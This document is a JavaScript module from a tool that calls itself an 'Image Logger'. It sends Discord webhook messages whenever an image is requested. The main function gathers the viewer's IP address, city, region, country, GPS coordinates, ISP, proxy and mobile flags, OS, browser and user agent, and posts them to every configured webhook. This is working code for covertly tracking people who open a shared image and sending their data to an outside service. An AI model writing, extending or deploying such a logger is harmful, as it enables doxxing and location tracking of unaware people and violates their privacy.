const fs = require('fs')
const path = require('path')
const axios = require('axios')
const logger = require('./logger')
const { WebhookClient, EmbedBuilder } = require('discord.js')

const config = require('./config.json')

const sendImageToWebhooks = (
  imageNameWithExtension,
  imagePath,
  clientIP,
  timezone,
  country,
  regionName,
  city,
  lat,
  lon,
  isp,
  as,
  mobile,
  proxy,
  hosting,
  os,
  browser,
  userAgent,
  domain
) => {
  imageNameWithExtension = imageNameWithExtension || 'not found'
  imagePath = imagePath || 'not found'
  clientIP = clientIP || 'not found'
  timezone = timezone || 'not found'
  country = country || 'not found'
  regionName = regionName || 'not found'
  city = city || 'not found'
  lat = lat || 'not found'
  lon = lon || 'not found'
  isp = isp || 'not found'
  as = as || 'not found'
  mobile = mobile || 'not found'
  proxy = proxy || 'not found'
  hosting = hosting || 'not found'
  os = os || 'not found'
  browser = browser || 'not found'
  userAgent = userAgent || 'not found'
  domain = domain || 'not found'

  config.webhooks.forEach(webhook => {
    const webhookClient = new WebhookClient({ url: webhook.url })
    const embed = new EmbedBuilder()
      .setTitle(`Requesting an **${imageNameWithExtension}** image`)
      .setURL(domain)
      .setFields([
        {
          name: '🖼️ Image',
          value: `\`\`\`shell\n🖼️ Name: ${imageNameWithExtension}\n🔗 URL: ${imagePath}\`\`\``
        },
        {
          name: '📡 Network',
          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${timezone}\n🌍 Country: ${country}\n🏙️ Region: ${regionName}\n🏙️ City: ${city}\n📍 Coordinates: ${lat}, ${lon}\n📡 ISP: ${isp}\n📡 AS: ${as}\n📱 Mobile: ${mobile}\n📡 Proxy: ${proxy}\n📡 Hosting: ${hosting}\`\`\``
        },
        {
          name: '📱 Device',
          value: `\`\`\`shell\n🖥️ OS: ${os}\n🌐 Browser: ${browser}\n\`\`\``
        },
        {
          name: '📱 User Agent',
          value: `\`\`\`shell\n${userAgent}\`\`\``
        }
      ])
      .setThumbnail('attachment://' + imageNameWithExtension)
      .setFooter({
        text: 'Image Logger',
        iconURL:
          'https://cliply.co/wp-content/uploads/2021/08/372108630_DISCORD_LOGO_400.gif'
      })
      .setColor('#00ff00')
      .setTimestamp()

    webhookClient
      .send({
        embeds: [embed]
      })
      .then(() => {
        logger.info(
          `Image ${imageNameWithExtension} sent to webhook ${webhook.name}`
        )
      })
      .catch(error => {
        logger.error(
          `Error sending image ${imageNameWithExtension} to webhook ${webhook.name}: ${error}`
        )
      })
  })
}

const sendImageToWebhooksGithub = (
  imageNameWithExtension,
  imagePath,
  domain
) => {
  imageNameWithExtension = imageNameWithExtension || 'not found'
  imagePath = imagePath || 'not found'
  domain = domain || 'not found'

  config.webhooks.forEach(webhook => {
    const webhookClient = new WebhookClient({ url: webhook.url })
    const embed = new EmbedBuilder()
      .setTitle(`Requesting **${imageNameWithExtension}** on GitHub`)
      .setURL(domain)
      .setAuthor({
        name: 'GitHub',
        iconURL:
          'https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png'
      })
      .setFields([
        {
          name: '🖼️ Image',
          value: `\`\`\`shell\n🖼️ Name: ${imageNameWithExtension}\n🔗 URL: ${imagePath}\`\`\``
        }
      ])
      .setThumbnail('attachment://' + imageNameWithExtension)
      .setFooter({
        text: 'Image Logger',
        iconURL:
          'https://cliply.co/wp-content/uploads/2021/08/372108630_DISCORD_LOGO_400.gif'
      })
      .setColor('#ffffff')
      .setTimestamp()

    webhookClient
      .send({
        embeds: [embed]
      })
      .then(() => {
        logger.info(
          `Image ${imageNameWithExtension} sent to webhook ${webhook.name}`
        )
      })
      .catch(error => {
        logger.error(
          `Error sending image ${imageNameWithExtension} to webhook ${webhook.name}: ${error}`
        )
      })
  })
}

module.exports = {
  sendImageToWebhooks,
  sendImageToWebhooksGithub
}
